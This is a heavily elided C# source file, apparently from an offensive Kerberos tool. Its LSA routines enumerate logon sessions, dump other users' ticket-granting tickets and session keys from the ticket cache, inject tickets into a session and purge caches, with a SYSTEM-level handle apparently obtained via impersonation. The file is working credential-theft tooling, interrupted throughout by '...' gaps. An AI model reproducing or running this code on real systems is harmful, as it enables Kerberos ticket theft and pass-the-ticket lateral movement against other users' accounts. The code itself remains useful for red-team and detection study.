    ...
    internal static class LSA
    {
        ...
        internal static List<KRB_CRED> ExtractTGTs(uint targetLuid = 0, bool includeComputerAccounts = false)
        {
            ...
            if (IntPtr.Zero == lsaHandle) {
                try { lsaHandle = GetLSAHandle(); }
                catch (Exception e) {
                    Console.WriteLine("[X] {0}.", e.Message);
                    Console.WriteLine("[X] Failed to get a LSA handle.");
                    return null;
                }
            }
            ...
            try {
                ...
                LSACall(Interop.LsaEnumerateLogonSessions(out count, out luidPtr));

                for (ulong i = 0; i < count; i++) {
                    IntPtr sessionData;
                    LSACall(Interop.LsaGetLogonSessionData(luidPtr, out sessionData));
                    ...
                    if (data.PSiD != IntPtr.Zero) {
                        ...
                        if (includeComputerAccounts || !Regex.IsMatch(username, ".*\\$$")) {
                            ...
                            DateTime logonTime = Helpers.BaseDate.AddTicks((long)data.LoginTime);
                            ...
                            if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid)) {
                                ...
                                IntPtr tQueryPtr = Helpers.AllocAndInit(tQuery);
                                    ...
                                    if (count2 != 0) {
                                        ...
                                        for (int j = 0; j < count2; j++) {
                                            ...
                                            if (string.IsNullOrEmpty(targetService) || Regex.IsMatch(serverName, string.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase)) {
                                                ...
                                                IntPtr unmanagedAddr = Helpers.AllocAndInit(request, tName.MaximumLength);
                                                // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                                                IntPtr newTargetNameBuffPtr = (IntPtr)(unmanagedAddr.ToInt64() +
                                                    Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST)));
                                                ...
                                                NativeReturnCode retCode = Interop.LsaCallAuthenticationPackage(lsaHandle,
                                                    authPack, unmanagedAddr,
                                                    Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST)) + tName.MaximumLength,
        ...
        internal static byte[] GetEncryptionKeyFromCache(string target, Interop.KERB_ETYPE etype)
        {
            ...
            int authenticationPackageIdentifier = 0;
            ...
            try {
                ...
                LSACall(Interop.LsaLookupAuthenticationPackage(lsaHandle, KerberosLsaInputString, out authenticationPackageIdentifier));
                ...
                // the following is due to the wonky way LsaCallAuthenticationPackage wants the
                // KERB_RETRIEVE_TKT_REQUEST for KerbRetrieveEncodedTicketMessages
                // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
                unmanagedAddr = Helpers.AllocAndInit(request, tName.MaximumLength);
                Helpers.AppendUnicodeString<Interop.KERB_RETRIEVE_TKT_REQUEST>(unmanagedAddr, tName, "TargetName");

                // actually get the data
                int protocalStatus = 0;
                int returnBufferLength = 0;
                NativeReturnCode retCode = Interop.LsaCallAuthenticationPackage(lsaHandle,
                    authenticationPackageIdentifier, unmanagedAddr,
                    Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST)) + tName.MaximumLength,
                    out responsePointer, out returnBufferLength, out protocalStatus);
                // translate the LSA error (if any) to a Windows error
                uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                if ((0 != retCode) || (0 != winError) || (0 == returnBufferLength)) {
                    Console.WriteLine(
                        "\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
                ...
                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(
                    responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                // extract the session key
                Interop.KERB_CRYPTO_KEY sessionKey = response.Ticket.SessionKey;
                Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)sessionKey.KeyType;
                int sessionKeyLength = sessionKey.Length;
                byte[] result = new byte[sessionKeyLength];
                Marshal.Copy(sessionKey.Value, result, 0, sessionKeyLength);
        ...
        /// <summary>Get a handle to Local Security Authority process. On error the method
        ...
        private static IntPtr GetLSAHandle()
        {
            ...
            IntPtr result;
            if ("NT AUTHORITY\\SYSTEM" == currentName) {
                // if we're already SYSTEM, we have the proper privilegess to get a Handle
                // to LSA with LsaRegisterLogonProcessHelper
                result = RegisterUser32LogonProcesss();
            }
            else {
                ...
                if (!Interop.RevertToSelf()) {
                    throw new ApplicationException("Failed to revert SYSTEM impersonation.");
                }
            }
            if (IntPtr.Zero == result) {
                throw new ApplicationException("Failed to get a LSA handle.");
            }
            return result;
        }
        ...
        internal static void ImportTicket(byte[] ticket, uint targetLuid = 0)
        {
            ...
            try {
                ...
                if (ntstatus != 0) {
                    Console.WriteLine(
                        "[X] Windows error running LsaLookupAuthenticationPackage: {0}",
                        Interop.LsaNtStatusToWinError((uint)ntstatus));
                    return;
                }
                ...
                inputBuffer = Helpers.AllocAndInit(request, ticket.Length);
                ...
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer,
                    (Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length),
                    out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (0 != ntstatus) {
                    Console.WriteLine(
                        "[X] Windows error running LsaCallAuthenticationPackage: {0}",
                        Interop.LsaNtStatusToWinError((uint)ntstatus));
                    return;
                }
                if (ProtocalStatus != 0) {
                    Console.WriteLine(
                        "[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}",
                        Interop.LsaNtStatusToWinError((uint)ProtocalStatus));
                    return;
                }
        ...
        {
            // Parse the new ptr to the appropriate structure
            Interop.KERB_TICKET_CACHE_INFO cachedTicket = (Interop.KERB_TICKET_CACHE_INFO)
                Marshal.PtrToStructure(nativeTicket, typeof(Interop.KERB_TICKET_CACHE_INFO));
            // Extract the serverName and ticket flags
            string serverName = Marshal.PtrToStringUni(cachedTicket.ServerName.Buffer,
                cachedTicket.ServerName.Length / sizeof(char));
            ...
            request.TicketFlags = cachedTicket.TicketFlags;
            request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
            request.EncryptionType = 0x0;
            // the target ticket name we want the ticket for
            Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
            ...
            try {
                int newStructSize;
                unmanagedAddr = Helpers.AllocAndInit(request, out newStructSize, tName.MaximumLength);
                Helpers.AppendUnicodeString<Interop.KERB_RETRIEVE_TKT_REQUEST>(unmanagedAddr, tName, "TargetName");
                // actually get the data
                int returnBufferLength;
                int protocalStatus;
                ...
                if ((0 != retCode) || (0 != (uint)winError) || (0 == returnBufferLength)) {
                    Console.WriteLine(
                        "\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
                        winError, serverName, Helpers.GetNativeErrorMessage(winError));
                    return false;
                ...
                // extract the session key
                Interop.KERB_EXTERNAL_TICKET ticket = response.Ticket;
                Interop.KERB_CRYPTO_KEY sessionKey = ticket.SessionKey;
                Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)sessionKey.KeyType;
                int sessionKeyLength = sessionKey.Length;
                byte[] rawSessionKey = new byte[sessionKeyLength];
                Marshal.Copy(sessionKey.Value, rawSessionKey, 0, sessionKeyLength);
                string base64SessionKey = Convert.ToBase64String(rawSessionKey);

                DateTime keyExpirationTime = DateTime.FromFileTime(ticket.KeyExpirationTime);
                DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                DateTime renewUntil = DateTime.FromFileTime(ticket.RenewUntil);
                long timeSkew = ticket.TimeSkew;
                int encodedTicketSize = ticket.EncodedTicketSize;
                // ???
                string ticketFlags = ((Interop.TicketFlags)cachedTicket.TicketFlags).ToString();
                        ...
                        try
                        {
                            ...
                            if (data.PSiD != IntPtr.Zero) {
                                ...
                                if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid)) {
                                    ...
                                    // query LSA, specifying we want the ticket cache
                                    IntPtr tQueryPtr = IntPtr.Zero;
                                    IntPtr ticketsPointer = IntPtr.Zero;

                                    try {
                                        tQueryPtr = Helpers.AllocAndInit(tQuery);
                                        LSACall(Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus));
                                        if (IntPtr.Zero != ticketsPointer) {
                                            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                                            tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                                            int count2 = tickets.CountOfTickets;
                                            ...
                                            if (0 != count2) {
                                                ...
                                                for (int j = 0; j < count2; j++)
                                                {
                                                    ...
                                                    if (String.IsNullOrEmpty(targetService) || (Regex.IsMatch(serverName, String.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase)))
                                                    {
                                                        ...
                                                        Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);
                                                        // actually get the data
                                                        NativeReturnCode retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack,
                                                            unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength,
                                                            out protocalStatus);
                                                        // translate the LSA error (if any) to a Windows error
                                                        uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);
        ...
        private static void ListKerberosTicketDataCurrentUser(string targetService)
        {
            ...
            // query LSA, specifying we want the ticket cache
            IntPtr cacheQueryPtr = Helpers.AllocAndInit(cacheQuery);
        ...
        internal static void Purge(uint targetLuid = 0)
        {
            ...
            try {
                NativeReturnCode ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle,
                    KerberosLsaInputString, out AuthenticationPackage);
                if (0 != ntstatus) {
                    Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}",
                        Interop.LsaNtStatusToWinError((uint)ntstatus));
                    return;
                }
                ...
                inputBuffer = Helpers.AllocAndInit(request);
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage,
                    inputBuffer, Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST)),
                    out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (0 != ntstatus) {
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}",
                        Interop.LsaNtStatusToWinError((uint)ntstatus));
                    return;
                }
                if (ProtocalStatus != 0) {
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}",
                        Interop.LsaNtStatusToWinError((uint)ProtocalStatus));
                    return;
                }
